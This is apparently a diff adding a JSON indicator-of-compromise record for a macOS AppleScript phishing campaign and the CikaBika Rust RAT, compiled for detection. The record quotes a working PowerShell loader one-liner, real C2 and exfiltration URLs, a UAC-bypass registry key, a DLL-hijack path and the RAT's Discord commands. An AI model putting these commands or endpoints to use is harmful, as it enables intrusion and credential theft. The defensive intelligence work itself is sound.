@@ -1,0 +1,671 @@
+{
+  "malware_family": "AppleScript TCC-abuse phishing campaign (macOS) / CikaBika Bot",
+  "threat_actor": "",
+  "platforms": [
+    "macos",
+    "windows"
+  ],
+  "summary": "A multistage macOS phishing campaign delivers AppleScript lures masquerading as Microsoft documents that exfiltrate credentials to sevrrhst[.]com and attempt to forge TCC authorizations for Apple-signed binaries before dropping a modular Node.js loader with LaunchAgent persistence. The same report documents CikaBika Bot, a Rust RAT unpacked by a Nim loader from a disk-image lure that hijacks Edge's delay-loaded dbghelp.dll and uses Discord channels plus ngrok for C2 and exfiltration. Detection anchors include the AppleScript/TCC artifacts (dscl -authonly, codesign -d --requirements, csreq, killall tccd, ~/.ex.scpt, ~/.nodes, com.appled.tcc) and the Edge dbghelp.dll plant plus Discord !shell command strings.",
+  "mitre_techniques": [
+    "T1566",
+    "T1059.002",
+    "T1059.004",
+    "T1059.007",
+    "T1222.002",
+    "T1036.005",
+    "T1140",
+    "T1547.001",
+    "T1553.006",
+    "T1082",
+    "T1057",
+    "T1105",
+    "T1204.002",
+    "T1036.007",
+    "T1059.001",
+    "T1027",
+    "T1548.002",
+    "T1112",
+    "T1574.001",
+    "T1016",
+    "T1113",
+    "T1059.003",
+    "T1102.002",
+    "T1560.001",
+    "T1567",
+    "T1070.004",
+    "T1218.010",
+    "T1005",
+    "T1074.001",
+    "T1041",
+    "T1564.003",
+    "T1027.013"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "file_name",
+      "value": "Confirmation_Token_Vesting.docx.scpt",
+      "context": "Phishing AppleScript attachment masquerading as a Microsoft Word document",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "EDD_Questionnaire_Individual_Blank_Form.docx.scpt",
+      "context": "Additional AppleScript lure listed in the IoC table",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Investor Profile (Japan-based) - Shiro Arai.pdf.scpt",
+      "context": "Additional AppleScript lure listed in the IoC table",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/.ex.scpt",
+      "context": "Retrieved second-stage AppleScript saved hidden, executed, then deleted",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/.nodes",
+      "context": "Directory created to hold node archive, bundled Node.js binary and JS payloads",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/Library/com.apple.commonjs",
+      "context": "Persistence folder receiving Node dependencies, package.json and default.js",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/Library/LaunchAgents",
+      "context": "Downloaded LaunchAgent plist launches node default.js on load",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "com.appled.tcc",
+      "context": "TCC directory renamed (missing 'e') to bypass integrity checks",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "node_addon",
+      "context": "Final Base64-decoded binary written to disk and executed hidden",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "index.js",
+      "context": "Node loader that profiles host and registers victim with the C2",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "default.js",
+      "context": "Base64 JS command loop periodically polling C2, launched by plist",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "addon.js",
+      "context": "Base64 JS final payload loader fetching binary via register.php?req=next",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "package.json",
+      "context": "Retrieved from C2 alongside default.js into com.apple.commonjs",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "dscl /Search -authonly <username> <password>",
+      "context": "Validates harvested credentials while a fake progress bar is shown",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "codesign -d --requirements",
+      "context": "Extracts code-signing requirement from trusted Apple applications",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "csreq",
+      "context": "Compiles extracted requirement into a binary trust object for TCC injection",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "killall tccd",
+      "context": "Forces tccd to release the lock on the TCC database before injection",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Finder, Terminal, Script Editor, osascript, bash",
+      "context": "Trusted Apple-signed binaries chosen for forged TCC authorizations",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "Full disk access, Screen recording, Accessibility, Camera, Apple Events, Input monitoring",
+      "context": "TCC services granted through forged access records",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "-WindowStyle Hidden Start-Process 'Presentation_Generale.pdf.pdf' -WindowStyle Minimized;$data=[IO.File]::ReadAllBytes('Presentation_Generale.pdf.pdf');$key=$data[239];$file=$env:TEMP+'\\IfyuUapz.txt';$xdata = ($data[144305..5726256] | ForEach-Object { $_ -bxor $key });[IO.File]::WriteAllBytes($file, $xdata);cmd /c $file",
+      "context": "CikaBika: LNK-embedded PowerShell; PDF byte 239 used as XOR key; parent: shortcut/explorer",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Proposition_Projet.img",
+      "context": "CikaBika: disk-image lure containing decoy PDF and malicious LNK",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Presentation_Generale.pdf.pdf",
+      "context": "CikaBika: double-extension decoy PDF displayed while PowerShell runs hidden",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Proposition_Projet_Personnalisable.docx.lnk",
+      "context": "CikaBika: LNK disguised as a Word document launching hidden PowerShell",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\IfyuUapz.txt",
+      "context": "CikaBika: XOR-decoded Nim loader written to temp and run via cmd /c",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\dbghelp.dll",
+      "context": "CikaBika: Rust DLL decoded from a Base64 blob inside the Nim loader",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\Temp\\dbghelp.tmp",
+      "context": "CikaBika: staged DLL copy moved by the UAC-bypass helper",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\dbghelp.dll",
+      "context": "CikaBika: RAT planted as Edge delay-loaded dependency via search-order hijacking",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command",
+      "context": "CikaBika: hijacked so computerdefaults.exe moves staged DLL into protected Edge dir",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "computerdefaults.exe",
+      "context": "CikaBika: auto-elevated binary abused for UAC bypass",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "regsvr32.exe",
+      "context": "CikaBika: invoked as fallback when Nim loadLib fails",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "dllFile",
+      "context": "CikaBika: loader reference name for the Base64-encoded Rust DLL blob",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "copyPs1",
+      "context": "CikaBika: loader reference name for the Base64 PowerShell deployment script",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "import_name",
+      "value": "ShowWindow",
+      "context": "CikaBika: user32 call in compiled C# helper hiding Windows Settings windows",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "MTQzMjcyMjA4Mzk5NzAyODUxMg.GJpNS2.CE19P",
+      "context": "CikaBika: Discord bot token/config literal inside the Rust RAT",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "1440633973104705547",
+      "context": "CikaBika: Discord channel/guild ID constant in the RAT configuration",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "dbghelp.dll",
+      "context": "CikaBika: malicious DLL name masquerading as Microsoft debug library",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "IfyuUapz.txt",
+      "context": "CikaBika: temp-dropped Nim loader filename",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "tasklist_startup.txt",
+      "context": "CikaBika: reconnaissance output artifact from tasklist enumeration",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "network_info.txt",
+      "context": "CikaBika: ipconfig output artifact uploaded to Discord",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "screenshot.png",
+      "context": "CikaBika: screenshot capture artifact",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!shell",
+      "context": "CikaBika: Discord command for remote command execution",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!sysinfo",
+      "context": "CikaBika: Discord command returning host details",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!download",
+      "context": "CikaBika: Discord command to retrieve files from the victim",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!upload",
+      "context": "CikaBika: Discord command to push files to the victim",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!tasklist",
+      "context": "CikaBika: Discord command for process enumeration",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!camera",
+      "context": "CikaBika: Discord command referencing camera access",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!src",
+      "context": "CikaBika: Discord command referencing screenshots",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Device is ready for manual commands",
+      "context": "CikaBika: Discord bot status message shown in device channel",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Available commands: !shell, !src, !info, !download, !upload, !sysinfo, !stream, !camera, !broadcast, !isOn",
+      "context": "CikaBika: Discord command listing",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "sevrrhst.com",
+      "context": "macOS campaign C2 receiving staged requests and credentials",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "88.119.171.59",
+      "context": "C2 IP listed in the macOS campaign IoC table",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://sevrrhst.com/inc/register.php?req=next",
+      "context": "Retrieves Base64-encoded binary executed as node_addon",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://stomcs.com/inc/register.php?req=next",
+      "context": "Additional register.php?req=next endpoint in IoC table",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://techcross-es.com",
+      "context": "Additional C2 domain listed in the IoC table",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://sevrrhst.com/css/controller.php?req=contact&ac=<user>&qd=<pass>",
+      "context": "Base64 username/password exfiltration endpoint",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/controller.php?req=instd",
+      "context": "Returns node archive during macOS stage",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/controller.php?req=tell",
+      "context": "Returns bundled Node.js binary",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/controller.php?req=skip",
+      "context": "Returns JavaScript payload index.js",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://sevrrhst.com/inc/register.php?req=init",
+      "context": "JSON host profile sent to register the victim with the C2",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://0487-105-96-75-236.ngrok-free.app/upload?filename=jdid1.zip",
+      "context": "CikaBika: ngrok endpoint used to exfiltrate a ZIP archive via curl POST",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "discord.com",
+      "context": "CikaBika C2 via Discord API channel messages",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/v10/channels/",
+      "context": "Discord API path used by the RAT for C2",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://cdn.discordapp.com/attachments/",
+      "context": "Discord CDN URL used to stage uploaded reconnaissance files",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "ipify.com",
+      "context": "CikaBika retrieves victim public IP during registration",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "dns_pattern",
+      "value": "*.ngrok-free.app",
+      "context": "ngrok tunnel host observed in exfiltration command",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "script",
+    "pe",
+    "unknown"
+  ]
+}
